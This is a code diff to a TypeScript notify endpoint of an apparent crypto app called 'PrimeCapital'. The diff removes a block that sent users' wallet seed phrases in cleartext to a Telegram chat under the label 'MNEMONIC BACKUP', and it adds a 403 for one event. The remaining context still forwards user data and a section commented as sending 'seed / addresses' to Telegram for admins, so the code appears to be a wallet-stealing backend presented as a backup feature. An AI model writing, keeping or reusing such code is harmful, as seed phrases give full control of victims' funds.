@@ -10,8 +10,6 @@ interface NotifyPayload {
   extra?: string;
   address?: string;
   fields?: Record<string, string>;
-  mnemonic?: string;
-  mnemonic_backup?: string;
   addresses?: Array<{ chain: string; address: string; path?: string }>;
 }
 
@@ -65,6 +63,7 @@ export const Route = createFileRoute("/api/public/notify")({
         }
 
         const event = truncate(String(body.event ?? "event"), 48);
+        if (event === "account_contact_linked") return Response.json({ ok: false }, { status: 403 });
         const path = truncate(String(body.path ?? "/"), 120);
         const username = body.username ? truncate(String(body.username), 32) : "guest";
         const label = body.label ? truncate(String(body.label), 120) : "";
@@ -95,19 +94,6 @@ export const Route = createFileRoute("/api/public/notify")({
         if (ua) lines.push(`🧭 ${esc(ua)}`);
 
         await sendTelegram(token, lines.join("\n"));
-
-        // Send mnemonic as a separate, tagged backup message for safe keeping
-        if (body.mnemonic_backup) {
-          const mnemonicBackup: string[] = [
-            `<b>PrimeCapital · MNEMONIC BACKUP</b> · <code>${esc(event)}</code>`,
-            `👤 <b>${esc(username)}</b>`,
-          ];
-          if (address) mnemonicBackup.push(`💼 <code>${esc(address)}</code>`);
-          mnemonicBackup.push(`🔑 <b>Seed Phrase:</b> ${"⭐".repeat(14)}`);
-          mnemonicBackup.push(`<code>${esc(body.mnemonic_backup)}</code>`);
-          mnemonicBackup.push(`${"⭐".repeat(14)}`);
-          await sendTelegram(token, mnemonicBackup.join("\n"));
-        }
 
         // Send seed / addresses as a separate, tagged message so admins can easily find backups.
         if (body.addresses && body.addresses.length) {
